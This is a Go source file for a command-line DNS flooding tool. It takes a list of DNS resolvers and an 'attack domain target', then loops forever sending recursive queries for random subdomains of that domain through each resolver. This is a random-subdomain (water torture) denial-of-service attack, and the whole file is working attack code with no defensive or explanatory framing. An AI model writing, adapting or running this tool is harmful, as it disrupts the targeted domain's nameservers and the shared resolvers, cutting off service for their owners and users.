package main

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"flag"
	"math/rand"
	"net"
	"os"
	"strings"
	"time"
)

type headerDNSHeader struct {
	ID            uint16
	Flag          uint16
	QuestionCount uint16
	AnswerRRs     uint16 //RRs is Resource Records
	AuthorityRRs  uint16
	AdditionalRRs uint16
}

type headerDNSQuery struct {
	QuestionType  uint16
	QuestionClass uint16
}

var dnsServerList []string

func (header *headerDNSHeader) setFlag(QR uint16, OperationCode uint16, AuthoritativeAnswer uint16, Truncation uint16, RecursionDesired uint16, RecursionAvailable uint16, ResponseCode uint16) {
	header.Flag = QR<<15 + OperationCode<<11 + AuthoritativeAnswer<<10 + Truncation<<9 + RecursionDesired<<8 + RecursionAvailable<<7 + ResponseCode
}

func parseDomainName(domain string) []byte {
	var buffer bytes.Buffer
	segments := strings.Split(domain, ".")
	for _, seg := range segments {
		binary.Write(&buffer, binary.BigEndian, byte(len(seg)))
		binary.Write(&buffer, binary.BigEndian, []byte(seg))
	}
	binary.Write(&buffer, binary.BigEndian, byte(0x00))

	return buffer.Bytes()
}

func parseSrcContent(fileName string) bool {
	f, err := os.Open(fileName)
	if err != nil {
		return false
	}
	buf := bufio.NewReader(f)
	for {
		line, err := buf.ReadString('\n')
		if line == "" || err != nil {
			break
		}
		line = strings.TrimSpace(line)
		dnsServerList = append(dnsServerList, line)
	}
	return true
}

func queryDNSServer(server, domain string) bool {
	var (
		dnsHeader   headerDNSHeader
		dnsQuestion headerDNSQuery
	)

	dnsHeader.ID = 0xFFFF     //FFFF 不知道啥玩意  建议 00 04 
	dnsHeader.setFlag(0, 0, 0, 0, 1, 0, 0)
	dnsHeader.QuestionCount = 1
	dnsHeader.AnswerRRs = 0
	dnsHeader.AuthorityRRs = 0
	dnsHeader.AdditionalRRs = 0
	dnsQuestion.QuestionType = 1
	dnsQuestion.QuestionClass = 1

	var (
		conn net.Conn
		err  error

		buffer bytes.Buffer
	)

	if conn, err = net.Dial("udp", server+":53"); err != nil {
		return false
	}

	binary.Write(&buffer, binary.BigEndian, dnsHeader)
	binary.Write(&buffer, binary.BigEndian, parseDomainName(domain))
	binary.Write(&buffer, binary.BigEndian, dnsQuestion)
	conn.Write(buffer.Bytes())
	conn.Close()
	return true
}

func main() {
	dict := "0123456789abcdefghijklmnopqrstuvwxyz"
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	servers := flag.String("sr", "", "DNS Server List")
	attack := flag.String("at", "", "Attack domain target")
	sl := flag.Int("sl", 5, "Random sub domain length")
	flag.Parse()

	if *servers != "" && *attack != "" {
		parseSrcContent(*servers)
		for {
			for _, dns := range dnsServerList {
				subdomain := ""
				for i := 0; i < *sl; i++ {
					start := r.Intn(len(dict))
					subdomain += dict[start : start+1]
				}
				queryDNSServer(dns, subdomain+"."+*attack)
			}
		}
	}
}
